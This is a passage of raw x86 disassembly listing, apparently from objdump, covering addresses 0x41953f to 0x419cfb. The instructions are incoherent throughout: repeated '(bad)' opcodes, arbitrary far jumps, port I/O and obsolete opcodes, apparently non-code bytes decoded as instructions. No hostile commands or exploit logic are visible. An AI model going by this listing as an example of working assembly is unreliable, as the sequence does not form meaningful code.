  41953f:	add    ecx,DWORD PTR [ebp-0x78dfe581]
  419545:	add    DWORD PTR [ebx-0x7aec95bd],0x21f1bbea
  41954f:	push   es
  419550:	add    al,0x2a
  419552:	xchg   BYTE PTR ds:[ebp+0x18],ch
  419556:	lahf   
  419557:	aaa    
  419558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419559:	scas   eax,DWORD PTR es:[edi]
  41955a:	and    bl,BYTE PTR [edx]
  41955c:	mov    edx,0x4a46141c
  419561:	jno    0x41953a
  419563:	pop    ebx
  419564:	push   ss
  419565:	fistp  QWORD PTR [esi+0x13]
  419568:	sti    
  419569:	mov    BYTE PTR [esp+ecx*4+0x6d09bd8c],bh
  419570:	mov    ah,0xd9
  419572:	test   al,dh
  419574:	adc    BYTE PTR [edx+eax*2+0x1d53e8f1],bl
  41957b:	out    0x12,eax
  41957d:	fdivr  QWORD PTR [ebp-0x56641ab5]
  419583:	jbe    0x4195da
  419585:	inc    ecx
  419586:	cmp    BYTE PTR [edi+0x7fcdbf91],cl
  41958c:	mov    bl,0x46
  41958e:	jbe    0x4195d5
  419590:	out    0x8e,eax
  419592:	sub    DWORD PTR [ebp+edx*2+0x2b],ebp
  419596:	enter  0xa967,0x20
  41959a:	cmp    BYTE PTR [edi+0x5b],al
  41959d:	(bad)  
  41959e:	call   FWORD PTR [esp+ebp*4-0x4ad9818b]
  4195a5:	ins    DWORD PTR es:[edi],dx
  4195a6:	not    DWORD PTR [edi-0x65]
  4195a9:	dec    ecx
  4195aa:	dec    edi
  4195ab:	push   ecx
  4195ac:	xchg   edi,eax
  4195ad:	or     esp,ecx
  4195af:	inc    edx
  4195b0:	clc    
  4195b1:	sbb    eax,0x64c8228
  4195b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195b7:	or     ecx,0xffffffae
  4195ba:	sub    ebp,edx
  4195bc:	cmp    BYTE PTR [edi+0x4ddae465],bh
  4195c2:	adc    DWORD PTR [eax-0x7a],esi
  4195c5:	or     al,0x29
  4195c7:	dec    esp
  4195c8:	adc    cl,al
  4195ca:	cmp    BYTE PTR [edi+0x4f],dl
  4195cd:	cmp    dl,bl
  4195cf:	add    eax,0x1d054aa0
  4195d4:	ins    DWORD PTR es:[edi],dx
  4195d5:	cmp    eax,DWORD PTR [ebx-0x15bc2c40]
  4195db:	jmp    0x13d2151f
  4195e0:	push   ds
  4195e1:	popf   
  4195e2:	les    esi,FWORD PTR [ecx-0x6c040af2]
  4195e8:	shl    BYTE PTR [ebx-0x24],cl
  4195eb:	in     al,0x16
  4195ed:	imul   edi,eax,0x69
  4195f0:	(bad)  
  4195f1:	mov    eax,0x36a8c915
  4195f6:	dec    edi
  4195f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195f8:	or     eax,0xe40470ef
  4195fd:	icebp  
  4195fe:	mov    bh,0x5a
  419600:	mov    ecx,0x55bf9edc
  419605:	push   ebp
  419606:	in     eax,0xce
  419608:	icebp  
  419609:	imul   ebx,DWORD PTR [ebp+0x16787370],0x39
  419610:	loop   0x4195ce
  419612:	push   ecx
  419613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419614:	fadd   QWORD PTR [ebx]
  419616:	pop    ebp
  419617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419618:	xor    eax,DWORD PTR [ecx]
  41961a:	lods   al,BYTE PTR ds:[esi]
  41961b:	sub    edi,DWORD PTR [ebp-0x6f]
  41961e:	loop   0x419642
  419620:	repz into 
  419622:	or     eax,0xa90a4032
  419627:	fnstsw WORD PTR [edi-0x23]
  41962a:	hlt    
  41962b:	inc    eax
  41962c:	adc    bh,BYTE PTR [ecx]
  41962e:	xchg   ecx,eax
  41962f:	push   ecx
  419630:	icebp  
  419631:	dec    ecx
  419632:	xchg   esp,eax
  419633:	pop    es
  419634:	fnstcw WORD PTR [edx]
  419636:	shl    BYTE PTR [ecx-0x31],0x10
  41963a:	jmp    0xe587:0xb88dd10b
  419641:	sbb    DWORD PTR [ecx+0x627081c3],ebx
  419647:	jecxz  0x4195df
  419649:	jge    0x41964d
  41964b:	push   0x23
  41964d:	lods   al,BYTE PTR ds:[esi]
  41964e:	jb     0x41963f
  419650:	mov    ecx,0x37859aca
  419655:	imul   eax,DWORD PTR [ecx],0xffffff98
  419658:	sub    eax,0xa3f6339e
  41965d:	test   eax,ebx
  41965f:	push   0x16b123d8
  419664:	lea    esp,[edi+0x40000d18]
  41966a:	adc    DWORD PTR [esi+eiz*1],ecx
  41966d:	mov    ecx,0x19871b70
  419672:	pop    es
  419673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419674:	cmp    bl,bh
  419676:	leave  
  419677:	loopne 0x4196a0
  419679:	lock lock sub al,0x52
  41967d:	adc    eax,0x711a03d0
  419682:	mov    al,ds:0xfc7780d8
  419687:	imul   edx,DWORD PTR [ebx+0x478ad507],0xffffff89
  41968e:	les    edi,FWORD PTR [edx+0x79]
  419691:	push   0x488c31dd
  419696:	inc    esp
  419697:	mov    ebp,0x54e16f77
  41969c:	jle    0x419693
  41969e:	mov    al,ds:0xaaa9ac7
  4196a3:	dec    esp
  4196a4:	xchg   edx,eax
  4196a5:	lahf   
  4196a6:	sub    BYTE PTR [esi+ecx*8+0x671fae8d],ah
  4196ad:	and    al,0x64
  4196af:	stos   BYTE PTR es:[edi],al
  4196b0:	pop    esp
  4196b1:	cmp    bh,bl
  4196b3:	xor    ecx,DWORD PTR [ebx+0x61ec68ca]
  4196b9:	aad    0xd1
  4196bb:	scas   al,BYTE PTR es:[edi]
  4196bc:	dec    esi
  4196bd:	ins    BYTE PTR es:[edi],dx
  4196be:	mov    edi,0x98e9d17a
  4196c3:	(bad)  
  4196c4:	mov    edx,0x7f02f832
  4196c9:	or     eax,0xa364e45
  4196ce:	ret    
  4196cf:	cmc    
  4196d0:	push   ebp
  4196d1:	and    cl,bh
  4196d3:	fs leave 
  4196d5:	jle    0x419701
  4196d7:	jb     0x4196f7
  4196d9:	mov    ebx,0x5a56e1d6
  4196de:	or     eax,0xd0d8d0d4
  4196e3:	dec    edi
  4196e4:	adc    DWORD PTR [eax],ecx
  4196e6:	and    eax,0x62ee4b15
  4196eb:	dec    esp
  4196ec:	dec    ebp
  4196ed:	stos   DWORD PTR es:[edi],eax
  4196ee:	push   esi
  4196ef:	shufps xmm4,xmm7,0xc0
  4196f3:	jp     0x419676
  4196f5:	es ja  0x4196c4
  4196f8:	xchg   BYTE PTR [ebp+0x5e2c7bb0],al
  4196fe:	in     al,dx
  4196ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419700:	aad    0x4e
  419702:	or     cl,BYTE PTR [esi]
  419704:	add    edi,DWORD PTR ds:0xa4f00095
  41970a:	adc    DWORD PTR [ebp-0x7b6eb3b0],ebx
  419710:	push   0x5a0bf00d
  419715:	enter  0xc148,0xb0
  419719:	adc    DWORD PTR [edx-0x53],ebp
  41971c:	cdq    
  41971d:	cld    
  41971e:	mov    edx,0x5e7b7baa
  419723:	cmp    DWORD PTR [eax-0x1c0763d],0x3b
  41972a:	jb     0x41975f
  41972c:	movaps XMMWORD PTR [esi+0x2e001322],xmm3
  419733:	dec    ebx
  419734:	adc    eax,ebp
  419736:	and    eax,0x776a592f
  41973b:	mov    es,edi
  41973d:	pop    ebx
  41973e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41973f:	pusha  
  419740:	and    esp,DWORD PTR [esi+0x7ff99d0]
  419746:	push   ebx
  419747:	popa   
  419748:	push   ecx
  419749:	lahf   
  41974a:	xchg   ebp,eax
  41974b:	std    
  41974c:	push   es
  41974d:	xchg   eax,esi
  41974f:	rol    DWORD PTR [edx],0x1d
  419752:	sub    bh,BYTE PTR [eax+edi*2+0x542e4596]
  419759:	push   cs
  41975a:	aam    0xc3
  41975c:	outs   dx,DWORD PTR ds:[esi]
  41975d:	in     eax,0x76
  41975f:	mov    al,0x80
  419761:	test   DWORD PTR [edi+0x5f971243],ecx
  419767:	pop    esi
  419768:	cmc    
  419769:	out    dx,al
  41976a:	inc    eax
  41976b:	(bad)  
  41976c:	fstp   DWORD PTR [eax-0xeacfc80]
  419772:	push   edx
  419773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419774:	ins    BYTE PTR es:[edi],dx
  419775:	xchg   ebp,eax
  419776:	inc    edx
  419777:	pop    ss
  419778:	mov    ah,0xdc
  41977a:	xor    eax,0x7522adb0
  41977f:	iret   
  419780:	mov    DWORD PTR [ebp-0xea4101f],edx
  419786:	cwde   
  419787:	(bad)  
  419788:	pop    esi
  419789:	mov    ds:0xfe517982,eax
  41978e:	scas   al,BYTE PTR es:[edi]
  41978f:	add    DWORD PTR [edi+0x1d],edx
  419792:	mov    ds:0xb387ee24,al
  419797:	pusha  
  419798:	ss cmp eax,0xc9d212ec
  41979e:	loopne 0x4197d1
  4197a0:	out    0x10,eax
  4197a2:	inc    edx
  4197a3:	sbb    DWORD PTR [eax*8+0x291708e],esp
  4197aa:	gs ins BYTE PTR es:[edi],dx
  4197ac:	add    DWORD PTR [edx+0xd],edx
  4197af:	sbb    edx,DWORD PTR [eax*4-0x188e2487]
  4197b6:	dec    ecx
  4197b7:	rcl    DWORD PTR ds:0xe797270b,1
  4197bd:	sbb    eax,0x25854a4f
  4197c2:	in     eax,0xb6
  4197c4:	ja     0x419809
  4197c6:	mov    bl,0xc7
  4197c8:	xchg   ebx,eax
  4197c9:	test   DWORD PTR [esi-0x28],eax
  4197cc:	jge    0x41984c
  4197ce:	div    DWORD PTR [ebx]
  4197d0:	mov    edx,0xfb20d1ac
  4197d5:	mov    ch,0x22
  4197d7:	pop    ecx
  4197d8:	pop    ecx
  4197d9:	sub    BYTE PTR [edi],cl
  4197db:	cmp    eax,0xe55ca6ae
  4197e0:	jmp    0x6e918181
  4197e5:	push   ss
  4197e6:	inc    ebp
  4197e7:	and    al,0x90
  4197e9:	sbb    BYTE PTR [esi-0x5a39d77d],0xb7
  4197f0:	loopne 0x4197b1
  4197f2:	fwait
  4197f3:	jo     0x419871
  4197f5:	pop    edx
  4197f6:	push   0xd3aa3c05
  4197fb:	pusha  
  4197fc:	fwait
  4197fd:	dec    eax
  4197fe:	out    0x3a,eax
  419800:	mov    cl,0x28
  419802:	addr16 or eax,0x6a274155
  419808:	push   es
  419809:	and    al,0x92
  41980b:	in     al,dx
  41980c:	or     eax,0x98a5398a
  419811:	cmp    BYTE PTR [ebx+ebx*1-0x2153f5f1],ah
  419818:	adc    eax,DWORD PTR [edi-0x207aa181]
  41981e:	sbb    esi,edx
  419820:	pop    edx
  419821:	xor    DWORD PTR [ebx+eax*4+0x453d5d9],ebx
  419828:	pop    es
  419829:	mov    bh,0x6e
  41982b:	dec    eax
  41982c:	jo     0x419826
  41982e:	jno    0x4197bf
  419830:	les    ebp,FWORD PTR [esi+0x561374a4]
  419836:	pop    ebp
  419837:	(bad)  
  419838:	hlt    
  419839:	jmp    0x6ea9:0x80160591
  419840:	and    BYTE PTR [edi+0x495751f9],dl
  419846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419847:	dec    ebx
  419848:	cmp    DWORD PTR [ebx],ecx
  41984a:	out    0x91,eax
  41984c:	sbb    al,BYTE PTR [esi-0x17]
  41984f:	push   eax
  419850:	jb     0x4197dc
  419852:	mov    eax,0xa38f064d
  419857:	add    edx,DWORD PTR [esi+0x3aefc0d0]
  41985d:	repz lahf 
  41985f:	iret   
  419860:	(bad)  
  419861:	adc    bl,BYTE PTR [ebx]
  419863:	cmc    
  419864:	pop    ebx
  419865:	into   
  419866:	call   0xa8d5:0x47b70fda
  41986d:	in     al,0xb9
  41986f:	and    BYTE PTR [edi],0x46
  419872:	adc    ch,ch
  419874:	loope  0x4198a3
  419876:	fimul  DWORD PTR [edx-0x4a3aeb5b]
  41987c:	mov    bh,0xa7
  41987e:	mov    edi,DWORD PTR [ebx+0x441bd012]
  419884:	adc    ecx,ecx
  419886:	and    al,0x2f
  419888:	ss jae 0x4198a5
  41988b:	xor    eax,0x7291f26a
  419890:	xchg   BYTE PTR [ecx+0x2a],bh
  419893:	push   es
  419894:	xchg   esi,eax
  419895:	and    BYTE PTR [ebp+edx*4+0x2678dbc7],al
  41989c:	xor    DWORD PTR [ecx],edi
  41989e:	mov    eax,ds:0x7f091e24
  4198a3:	push   0x17
  4198a5:	mov    ch,0x3a
  4198a7:	sbb    bl,BYTE PTR [esi+ebp*8+0x8002dcb]
  4198ae:	fs xchg ebp,eax
  4198b0:	fldenv [edi-0x378c1691]
  4198b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198b7:	test   al,0xc9
  4198b9:	mov    ds:0x7b56d24e,al
  4198be:	int    0xcb
  4198c0:	jmp    0x4198aa
  4198c2:	pop    edx
  4198c3:	imul   esp,DWORD PTR [ebp-0x42ea8e7f],0xfa6f367b
  4198cd:	retf   0x134d
  4198d0:	(bad)  
  4198d1:	lds    ebx,FWORD PTR [edi+0x5dbede63]
  4198d7:	sbb    BYTE PTR ds:0x5fa46f58,0x40
  4198de:	cmp    bl,BYTE PTR [ecx-0x308351b]
  4198e4:	out    0x88,eax
  4198e6:	hlt    
  4198e7:	(bad)  
  4198e8:	fidivr DWORD PTR [ebp-0x1426b040]
  4198ee:	xor    al,0xaa
  4198f0:	mov    dl,BYTE PTR [ecx+ecx*1]
  4198f3:	ja     0x419937
  4198f5:	dec    esp
  4198f6:	xchg   esp,eax
  4198f7:	and    edx,DWORD PTR [edx]
  4198f9:	mov    ds:0x2ded926e,al
  4198fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198ff:	inc    edx
  419900:	xor    DWORD PTR [ecx-0x4d],ebx
  419903:	pushf  
  419904:	bound  edx,QWORD PTR [esi]
  419906:	jno    0x419966
  419908:	xchg   BYTE PTR [ebp+0x5e2609d3],ah
  41990e:	scas   al,BYTE PTR es:[edi]
  41990f:	(bad)  
  419910:	sar    DWORD PTR [ecx+eiz*1-0x41e62d61],cl
  419917:	(bad)  
  419918:	ret    
  419919:	add    al,0xa9
  41991b:	push   0xa4f12fd8
  419920:	fidivr WORD PTR [ebp-0x30]
  419923:	fidivr WORD PTR [ecx-0x1]
  419926:	out    dx,al
  419927:	nop
  419928:	xchg   ebp,eax
  419929:	sbb    dl,BYTE PTR [ebx+edx*4]
  41992c:	ret    0x2d59
  41992f:	mov    eax,0x43d5342b
  419934:	push   eax
  419935:	adc    eax,0xb5366e97
  41993a:	mov    bh,0x52
  41993c:	int    0xca
  41993e:	adc    al,0x1d
  419940:	xchg   edi,eax
  419941:	outs   dx,DWORD PTR ds:[esi]
  419942:	and    al,BYTE PTR [edx]
  419944:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419945:	sub    BYTE PTR [esi],ah
  419947:	out    dx,eax
  419948:	jbe    0x4198f6
  41994a:	jae    0x41996d
  41994c:	add    al,0x33
  41994e:	in     al,0x65
  419950:	or     DWORD PTR [edx-0x1c],eax
  419953:	imul   ebp,DWORD PTR [eax-0x49],0x62
  419957:	into   
  419958:	sbb    BYTE PTR [esi-0x3ae428c2],bh
  41995e:	scas   al,BYTE PTR es:[edi]
  41995f:	(bad)  
  419960:	push   ss
  419961:	pop    ds
  419962:	dec    ebp
  419963:	jp     0x41994f
  419965:	scas   eax,DWORD PTR es:[edi]
  419966:	repz cmp esi,DWORD PTR [eax-0x2]
  41996a:	mov    eax,ds:0xaee7e8ee
  41996f:	mov    eax,ds:0xb90490cd
  419974:	jle    0x4199b4
  419976:	inc    edi
  419977:	mov    ?,WORD PTR [edx-0x2b384307]
  41997d:	cmp    esi,eax
  41997f:	popa   
  419980:	sbb    eax,0x5fd63ba4
  419985:	pop    eax
  419986:	lahf   
  419987:	sub    BYTE PTR [ebx+0x265c60fb],ah
  41998d:	out    0x1a,al
  41998f:	mov    BYTE PTR [esi],dh
  419991:	fninit 
  419993:	scas   eax,DWORD PTR es:[edi]
  419994:	or     dl,BYTE PTR [ebp*1-0x6da50ffa]
  41999b:	xchg   ecx,eax
  41999c:	scas   eax,DWORD PTR es:[edi]
  41999d:	aas    
  41999e:	inc    ebp
  41999f:	and    bh,BYTE PTR [edx-0x22586dee]
  4199a5:	add    eax,0x7772f3f2
  4199aa:	dec    eax
  4199ab:	add    al,0x1
  4199ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199ae:	cmp    edi,DWORD PTR ds:0x571d711
  4199b4:	mov    ah,0xe4
  4199b6:	cmc    
  4199b7:	push   ebp
  4199b8:	in     eax,dx
  4199b9:	mov    BYTE PTR [edx-0x64],ch
  4199bc:	outs   dx,BYTE PTR ds:[esi]
  4199bd:	mov    edi,0xe4c5eb94
  4199c2:	outs   dx,DWORD PTR ds:[esi]
  4199c3:	scas   al,BYTE PTR es:[edi]
  4199c4:	das    
  4199c5:	scas   eax,DWORD PTR es:[edi]
  4199c6:	lahf   
  4199c7:	test   al,0x6c
  4199c9:	cwde   
  4199ca:	mov    BYTE PTR [ecx],bl
  4199cc:	inc    esp
  4199cd:	or     DWORD PTR [ebx],edi
  4199cf:	fs pop es
  4199d1:	add    BYTE PTR [ebp-0x7],0xac
  4199d5:	xchg   ebx,esp
  4199d7:	pushf  
  4199d8:	imul   DWORD PTR [ebp-0x57eaec1c]
  4199de:	push   DWORD PTR [edi+eax*1+0x122f8987]
  4199e5:	xchg   esp,eax
  4199e6:	ins    DWORD PTR es:[edi],dx
  4199e7:	loope  0x4199e9
  4199e9:	jno    0x41997a
  4199eb:	(bad)  
  4199ed:	sahf   
  4199ee:	push   cs
  4199ef:	cs dec eax
  4199f1:	jmp    0xebe465e2
  4199f6:	ret    0xf6ff
  4199f9:	outs   dx,BYTE PTR ds:[esi]
  4199fa:	jo     0x419a15
  4199fc:	pop    esi
  4199fd:	rol    BYTE PTR [edi+0x6184a5e5],0x3d
  419a04:	nop
  419a05:	dec    ebx
  419a06:	xor    eax,0xf9585abc
  419a0b:	mov    eax,ds:0xe0521c1b
  419a10:	hlt    
  419a11:	mov    bh,0x62
  419a13:	inc    eax
  419a14:	cld    
  419a15:	mov    esi,0x9e5a349e
  419a1a:	cmp    BYTE PTR [esp+edx*1],dh
  419a1d:	jmp    0x4064:0x126e34c9
  419a24:	(bad)  
  419a25:	inc    ebp
  419a26:	fiadd  DWORD PTR [ebp+0x37]
  419a29:	clc    
  419a2a:	ficomp DWORD PTR ss:[ecx+0x7]
  419a2e:	mov    dl,0xa2
  419a30:	adc    bl,0x18
  419a33:	jb     0x419a23
  419a35:	jbe    0x419a71
  419a37:	push   esi
  419a38:	in     eax,dx
  419a39:	sbb    DWORD PTR [edx+0x7c669318],edi
  419a3f:	das    
  419a40:	push   esi
  419a41:	out    dx,eax
  419a42:	and    edx,eax
  419a44:	pop    esi
  419a45:	pop    ds
  419a46:	int    0x97
  419a48:	in     eax,0x4b
  419a4a:	sbb    ebp,DWORD PTR [edi-0x56]
  419a4d:	xchg   ecx,eax
  419a4e:	daa    
  419a4f:	sbb    eax,0x789d51bf
  419a54:	(bad)  
  419a55:	std    
  419a56:	retf   0xa30b
  419a59:	pop    ds
  419a5a:	add    eax,0xcb883dad
  419a5f:	lds    eax,FWORD PTR [ecx+edx*2+0xd]
  419a63:	jbe    0x419a01
  419a65:	mov    ebx,0x1b2a0606
  419a6a:	mov    DWORD PTR [edx-0x7360a71e],edi
  419a70:	fwait
  419a71:	add    DWORD PTR [edi],edi
  419a73:	out    dx,eax
  419a74:	frstor [edx+0x53370c14]
  419a7a:	sbb    ecx,DWORD PTR [ebp-0x78]
  419a7d:	inc    edi
  419a7e:	or     al,0x84
  419a80:	mov    DWORD PTR [edi-0x13],ebp
  419a83:	xor    DWORD PTR [ebp+0x7e8c8bd2],esp
  419a89:	leave  
  419a8a:	jmp    0x832c:0xe2007c90
  419a91:	xor    eax,0xe8074836
  419a96:	or     ah,BYTE PTR [esi+0x6c41db42]
  419a9c:	mov    esi,0x6d8daa14
  419aa1:	cmp    BYTE PTR [eax+0x513c35ef],cl
  419aa7:	dec    esi
  419aa8:	enter  0x4613,0x7b
  419aac:	fistp  QWORD PTR [ebp-0x62]
  419aaf:	cmc    
  419ab0:	cmp    bl,BYTE PTR ds:0x26e50851
  419ab6:	push   0xf6b7d857
  419abb:	add    BYTE PTR [eax],0x9c
  419abe:	aas    
  419abf:	daa    
  419ac0:	cmp    eax,0x1fb01a11
  419ac5:	jnp    0x419b05
  419ac7:	add    ah,cl
  419ac9:	sub    DWORD PTR [ebp-0x4a],ebx
  419acc:	ret    0xefbb
  419acf:	xchg   edi,eax
  419ad0:	xor    esi,DWORD PTR [edi]
  419ad2:	fidivr WORD PTR [edx]
  419ad4:	sub    al,0x65
  419ad6:	fcmovu st,st(5)
  419ad8:	mov    eax,0xd523de08
  419add:	popa   
  419ade:	xchg   DWORD PTR [eax+0x3005512d],ebp
  419ae4:	adc    BYTE PTR [edx-0x28],bh
  419ae7:	adc    eax,0xed0b1738
  419aec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419aed:	adc    eax,0x5993636a
  419af2:	jbe    0x419ac7
  419af4:	inc    esi
  419af5:	or     eax,0xb9a43e40
  419afa:	xchg   ecx,eax
  419afb:	or     ecx,DWORD PTR [ecx]
  419afd:	add    BYTE PTR [edi],0x20
  419b00:	scas   eax,DWORD PTR es:[edi]
  419b01:	in     eax,dx
  419b02:	sbb    ch,dh
  419b04:	jnp    0x419b1b
  419b06:	rcl    cl,cl
  419b08:	push   ds
  419b09:	pop    es
  419b0a:	push   0xffffffbd
  419b0c:	mov    eax,ds:0xf2302d8b
  419b11:	fst    DWORD PTR [esi-0x70]
  419b14:	inc    ebp
  419b15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b16:	fdivr  st,st(6)
  419b18:	call   0x83864348
  419b1d:	dec    ecx
  419b1e:	jle    0x419ada
  419b20:	cwde   
  419b21:	mov    esp,cs
  419b23:	adc    dl,BYTE PTR [eax+0x25ee6852]
  419b29:	and    esi,edi
  419b2b:	daa    
  419b2c:	add    BYTE PTR [esi-0x6cad6ad1],0xc4
  419b33:	mov    ds:0x86359eb8,eax
  419b38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b39:	sub    edi,DWORD PTR ds:[edx+0x4b3e8d2]
  419b40:	aad    0x8b
  419b42:	rol    BYTE PTR [esi+edi*4+0x1b184fac],cl
  419b49:	dec    ecx
  419b4a:	or     DWORD PTR [esi+eax*1+0x63709dd9],ebx
  419b51:	ret    
  419b52:	gs (bad) 
  419b54:	cdq    
  419b55:	inc    ecx
  419b56:	push   ebx
  419b57:	mov    dh,0x93
  419b59:	clc    
  419b5a:	imul   BYTE PTR ss:[eax-0x13]
  419b5e:	bound  esp,QWORD PTR [ebp+0x4fac2b2d]
  419b64:	dec    esi
  419b65:	xchg   ebx,eax
  419b66:	retf   0x95c
  419b69:	xchg   ebx,eax
  419b6a:	sub    ebx,DWORD PTR [edx-0x68]
  419b6d:	or     edi,ebx
  419b6f:	nop
  419b70:	push   eax
  419b71:	xor    BYTE PTR [ecx-0x78438b7],al
  419b77:	in     eax,0xd9
  419b79:	xchg   ebp,eax
  419b7a:	cli    
  419b7b:	loopne 0x419b17
  419b7d:	call   0xe9bc:0xfd5b0759
  419b84:	lds    eax,FWORD PTR [eax]
  419b86:	mov    bl,0x41
  419b88:	xor    sp,WORD PTR [ecx-0x2a]
  419b8c:	xchg   esp,eax
  419b8d:	xchg   ebx,eax
  419b8e:	add    eax,0x3fe7c6e2
  419b93:	sbb    DWORD PTR [ecx-0x27],eax
  419b96:	jecxz  0x419be2
  419b98:	iret   
  419b99:	dec    ebx
  419b9a:	push   ebx
  419b9b:	xchg   ebx,eax
  419b9c:	out    dx,eax
  419b9d:	jo     0x419b8c
  419b9f:	sub    dh,dl
  419ba1:	mov    BYTE PTR [esi-0x2362f049],bh
  419ba7:	push   ds
  419ba8:	nop
  419ba9:	cdq    
  419baa:	icebp  
  419bab:	shl    dl,0x1b
  419bae:	(bad)  
  419bb0:	jmp    0xf349e44b
  419bb5:	sub    DWORD PTR [eax],edx
  419bb7:	inc    edi
  419bb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bb9:	pop    esi
  419bba:	jns    0x419b4a
  419bbc:	push   eax
  419bbd:	jle    0x419bb5
  419bbf:	aam    0x5d
  419bc1:	dec    ebx
  419bc2:	push   ecx
  419bc3:	sbb    eax,0x2728113d
  419bc8:	ss push es
  419bca:	xor    dl,BYTE PTR [ebx-0x79]
  419bcd:	leave  
  419bce:	mov    bl,0x8a
  419bd0:	jp     0x419bbd
  419bd2:	cmp    al,0x59
  419bd4:	arpl   dx,dx
  419bd6:	cmp    bh,BYTE PTR [eax-0x11b31e60]
  419bdc:	xor    eax,DWORD PTR [esi+0x76]
  419bdf:	jg     0x419bb8
  419be1:	dec    ecx
  419be2:	pop    ds
  419be3:	arpl   WORD PTR [eax],dx
  419be5:	add    DWORD PTR [ecx+eax*4+0x14],0xacb44e11
  419bed:	or     DWORD PTR [ebx-0x177cd475],eax
  419bf3:	test   al,0x9b
  419bf5:	fisttp WORD PTR [ecx+0x35]
  419bf8:	push   edx
  419bf9:	dec    esi
  419bfa:	add    bh,ah
  419bfc:	push   ecx
  419bfd:	daa    
  419bfe:	ss adc al,dh
  419c01:	push   cs
  419c02:	inc    ecx
  419c03:	and    DWORD PTR [eax],esp
  419c05:	fist   WORD PTR [esi+0xde66926]
  419c0b:	jp     0x419b9c
  419c0d:	adc    al,dh
  419c0f:	cmp    al,0x7a
  419c11:	xchg   edi,eax
  419c12:	add    bl,bh
  419c14:	pusha  
  419c15:	sub    al,0xa9
  419c17:	jmp    DWORD PTR [esi+ebp*8-0x505954e3]
  419c1e:	outs   dx,DWORD PTR ds:[esi]
  419c1f:	dec    esi
  419c20:	adc    BYTE PTR [ebx],bl
  419c22:	stc    
  419c23:	push   esi
  419c24:	pop    ds
  419c25:	test   eax,0x381c3bce
  419c2a:	(bad)  
  419c2c:	inc    esp
  419c2d:	pop    ds
  419c2e:	jb     0x419ca9
  419c30:	ds (bad) 
  419c32:	pop    esp
  419c33:	hlt    
  419c34:	retf   
  419c35:	test   DWORD PTR [edx],ecx
  419c37:	sub    BYTE PTR [ecx-0x1a],ch
  419c3a:	push   esp
  419c3b:	inc    edx
  419c3c:	rol    BYTE PTR [edx],cl
  419c3e:	inc    esi
  419c3f:	rol    DWORD PTR [esi],cl
  419c41:	je     0x419bd6
  419c43:	pop    edx
  419c44:	out    dx,eax
  419c45:	in     eax,dx
  419c46:	test   DWORD PTR [eax],edi
  419c48:	pop    esi
  419c49:	in     eax,0xd1
  419c4b:	retf   
  419c4c:	jmp    0x419bda
  419c4e:	rcl    BYTE PTR [edi-0x6f],cl
  419c51:	daa    
  419c52:	and    dl,dl
  419c54:	jno    0x419c01
  419c56:	nop
  419c57:	xchg   edi,eax
  419c58:	pop    es
  419c59:	in     al,dx
  419c5a:	inc    eax
  419c5b:	dec    ebp
  419c5c:	jl     0x419cc9
  419c5e:	das    
  419c5f:	mov    ebp,0xfaee173b
  419c64:	test   ebx,ebp
  419c66:	mov    ah,0x8
  419c68:	cmp    al,0xdb
  419c6a:	xchg   ebx,eax
  419c6b:	fnsetpm(287 only) 
  419c6d:	cli    
  419c6e:	sub    edi,esp
  419c70:	jle    0x419ca9
  419c72:	inc    ebp
  419c73:	jbe    0x419c7a
  419c75:	cld    
  419c76:	sbb    dh,BYTE PTR [eax+0x36]
  419c79:	mov    bh,BYTE PTR [edi+eiz*2]
  419c7c:	fiadd  WORD PTR [esi+edi*8+0x2c]
  419c80:	inc    eax
  419c81:	sub    dh,BYTE PTR [esi]
  419c83:	sbb    eax,0x8252f381
  419c88:	mov    bh,0x53
  419c8a:	test   BYTE PTR [ebp-0x15],ah
  419c8d:	jge    0x419c3b
  419c8f:	add    DWORD PTR [edi+0x569cdd78],0xbc7007ac
  419c99:	outs   dx,DWORD PTR ds:[esi]
  419c9a:	ja     0x419d09
  419c9c:	addr16 mov esi,0xad83438d
  419ca2:	jg     0x419cd9
  419ca4:	mov    bl,0x54
  419ca6:	inc    edi
  419ca7:	loopne 0x419cf1
  419ca9:	cmp    ebx,DWORD PTR [eax+esi*1]
  419cac:	in     eax,0x81
  419cae:	push   es
  419caf:	xor    BYTE PTR [ebx-0x28],al
  419cb2:	push   ecx
  419cb3:	xchg   ecx,eax
  419cb4:	pop    ebx
  419cb5:	and    eax,0x7c623ebd
  419cba:	je     0x419ce3
  419cbc:	mul    DWORD PTR [esp+esi*2+0x2e]
  419cc0:	inc    edi
  419cc1:	ins    BYTE PTR es:[edi],dx
  419cc2:	lods   al,BYTE PTR es:[esi]
  419cc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cc5:	fsubr  QWORD PTR ds:0x27a5a94
  419ccb:	or     eax,0xf222c39e
  419cd0:	push   DWORD PTR [edx+ebx*8]
  419cd3:	adc    bh,BYTE PTR [edx]
  419cd5:	arpl   WORD PTR gs:[ebx],dx
  419cd8:	sbb    al,0xbe
  419cda:	mov    al,0x95
  419cdc:	mov    edx,0x144d3f6f
  419ce1:	sub    BYTE PTR [ecx+0x2e7f8cef],0x8f
  419ce8:	inc    edx
  419ce9:	bnd jp 0x419d0c
  419cec:	stos   BYTE PTR es:[edi],al
  419ced:	mov    al,ds:0x533f3090
  419cf2:	cwde   
  419cf3:	xlat   BYTE PTR ds:[ebx]
  419cf4:	test   al,0x1
  419cf6:	call   ebx
  419cf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cf9:	sub    al,0x20
  419cfb:	(bad)  
